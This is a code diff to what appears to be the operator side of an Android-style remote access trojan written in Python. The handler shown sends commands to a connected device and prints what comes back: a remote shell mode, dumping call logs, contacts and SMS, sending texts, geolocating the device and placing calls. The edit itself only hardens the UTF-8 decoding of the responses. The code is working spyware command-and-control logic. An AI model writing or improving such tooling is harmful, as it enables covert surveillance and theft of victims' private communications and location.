@@ -105,7 +105,11 @@ def handle_client(client_socket, addr):
                     print(Fore.YELLOW + "[ * ] Exiting shell mode.")
                     break
                 client_socket.send(shell_command.encode('utf-8'))
-                output = client_socket.recv(4096).decode('utf-8')
+                try:
+                    output = client_socket.recv(4096).decode('utf-8', errors='ignore')
+                except UnicodeDecodeError as e:
+                    print(Fore.RED + f"Error decoding message: {e}")
+                    continue
                 print(Fore.WHITE + output)
             continue
 
@@ -116,37 +120,37 @@ def handle_client(client_socket, addr):
 
         if command.startswith("dump_calllog"):
             client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8')
+            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
             continue
 
         if command.startswith("dump_contacts"):
             client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8')
+            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
             continue
 
         if command.startswith("dump_sms"):
             client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8')
+            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
             continue
         
         if command.startswith("send_sms"):
             client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8')
+            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
             continue
 
         if command.startswith("geolocate"):
             client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8')
+            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
             continue
 
         if command.startswith("call"):
             client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8')
+            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
             continue
 
